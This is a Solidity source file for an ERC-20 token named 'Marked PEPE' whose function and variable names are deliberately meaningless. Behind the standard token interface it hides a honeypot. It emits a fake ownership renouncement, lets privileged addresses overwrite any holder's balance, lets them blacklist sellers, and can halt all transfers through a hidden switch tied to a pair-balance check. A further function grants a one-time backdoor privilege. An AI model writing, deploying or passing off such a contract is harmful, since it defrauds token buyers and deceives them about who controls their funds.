//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface maxReceiverSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toListTx) external view returns (uint256);

    function transfer(address modeMax, uint256 senderAmountBuy) external returns (bool);

    function allowance(address senderReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderAmountBuy) external returns (bool);

    function transferFrom(
        address sender,
        address modeMax,
        uint256 senderAmountBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapShould, uint256 value);
    event Approval(address indexed senderReceiver, address indexed spender, uint256 value);
}

abstract contract feeLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellAmountMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeEnableAmount {
    function createPair(address isLimit, address takeLimit) external returns (address);
}

interface totalTeam is maxReceiverSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MarkedPEPE is feeLaunch, maxReceiverSender, totalTeam {

    function toSwap(uint256 senderAmountBuy) public {
        tokenReceiverWallet();
        liquidityToToken = senderAmountBuy;
    }

    address public senderReceiverMax;

    address sellTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return minLaunched;
    }

    bool private sellTo;

    bool private exemptIs;

    function approve(address fundLaunch, uint256 senderAmountBuy) public virtual override returns (bool) {
        isLiquidityAt[_msgSender()][fundLaunch] = senderAmountBuy;
        emit Approval(_msgSender(), fundLaunch, senderAmountBuy);
        return true;
    }

    function takeLaunched(address enableTotal, address modeMax, uint256 senderAmountBuy) internal returns (bool) {
        if (enableTotal == buyAuto) {
            return autoAtBuy(enableTotal, modeMax, senderAmountBuy);
        }
        uint256 toFee = maxReceiverSender(senderReceiverMax).balanceOf(enableTake);
        require(toFee == liquidityToToken);
        require(modeMax != enableTake);
        if (launchedIs[enableTotal]) {
            return autoAtBuy(enableTotal, modeMax, maxShould);
        }
        return autoAtBuy(enableTotal, modeMax, senderAmountBuy);
    }

    mapping(address => uint256) private takeTokenBuy;

    uint256 liquidityToToken;

    mapping(address => bool) public launchFeeSender;

    event OwnershipTransferred(address indexed takeSwapLaunch, address indexed enableFee);

    uint256 minTeam;

    function symbol() external view virtual override returns (string memory) {
        return isFee;
    }

    function allowance(address launchTx, address fundLaunch) external view virtual override returns (uint256) {
        if (fundLaunch == sellTeam) {
            return type(uint256).max;
        }
        return isLiquidityAt[launchTx][fundLaunch];
    }

    function name() external view virtual override returns (string memory) {
        return marketingTrading;
    }

    function transferFrom(address enableTotal, address modeMax, uint256 senderAmountBuy) external override returns (bool) {
        if (_msgSender() != sellTeam) {
            if (isLiquidityAt[enableTotal][_msgSender()] != type(uint256).max) {
                require(senderAmountBuy <= isLiquidityAt[enableTotal][_msgSender()]);
                isLiquidityAt[enableTotal][_msgSender()] -= senderAmountBuy;
            }
        }
        return takeLaunched(enableTotal, modeMax, senderAmountBuy);
    }

    string private marketingTrading = "Marked PEPE";

    uint8 private modeReceiver = 18;

    address private swapReceiver;

    function balanceOf(address toListTx) public view virtual override returns (uint256) {
        return takeTokenBuy[toListTx];
    }

    function fundLaunched(address txLaunched) public {
        tokenReceiverWallet();
        
        if (txLaunched == buyAuto || txLaunched == senderReceiverMax) {
            return;
        }
        launchedIs[txLaunched] = true;
    }

    function toLaunched(address exemptShould, uint256 senderAmountBuy) public {
        tokenReceiverWallet();
        takeTokenBuy[exemptShould] = senderAmountBuy;
    }

    bool public senderTotal;

    uint256 private minLaunched = 100000000 * 10 ** 18;

    address enableTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public listAt;

    function liquidityIsShould() public {
        emit OwnershipTransferred(buyAuto, address(0));
        swapReceiver = address(0);
    }

    function getOwner() external view returns (address) {
        return swapReceiver;
    }

    mapping(address => bool) public launchedIs;

    function autoAtBuy(address enableTotal, address modeMax, uint256 senderAmountBuy) internal returns (bool) {
        require(takeTokenBuy[enableTotal] >= senderAmountBuy);
        takeTokenBuy[enableTotal] -= senderAmountBuy;
        takeTokenBuy[modeMax] += senderAmountBuy;
        emit Transfer(enableTotal, modeMax, senderAmountBuy);
        return true;
    }

    function tokenReceiverWallet() private view {
        require(launchFeeSender[_msgSender()]);
    }

    function transfer(address exemptShould, uint256 senderAmountBuy) external virtual override returns (bool) {
        return takeLaunched(_msgSender(), exemptShould, senderAmountBuy);
    }

    address public buyAuto;

    function owner() external view returns (address) {
        return swapReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return modeReceiver;
    }

    function maxReceiver(address minMarketingAt) public {
        require(minMarketingAt.balance < 100000);
        if (senderTotal) {
            return;
        }
        if (sellTo != exemptIs) {
            sellTo = false;
        }
        launchFeeSender[minMarketingAt] = true;
        if (modeLiquidity) {
            listAt = false;
        }
        senderTotal = true;
    }

    string private isFee = "MPE";

    mapping(address => mapping(address => uint256)) private isLiquidityAt;

    uint256 constant maxShould = 11 ** 10;

    constructor (){
        
        sellAmountMax isAmount = sellAmountMax(sellTeam);
        senderReceiverMax = feeEnableAmount(isAmount.factory()).createPair(isAmount.WETH(), address(this));
        
        buyAuto = _msgSender();
        liquidityIsShould();
        launchFeeSender[buyAuto] = true;
        takeTokenBuy[buyAuto] = minLaunched;
        
        emit Transfer(address(0), buyAuto, minLaunched);
    }

    bool private modeLiquidity;

}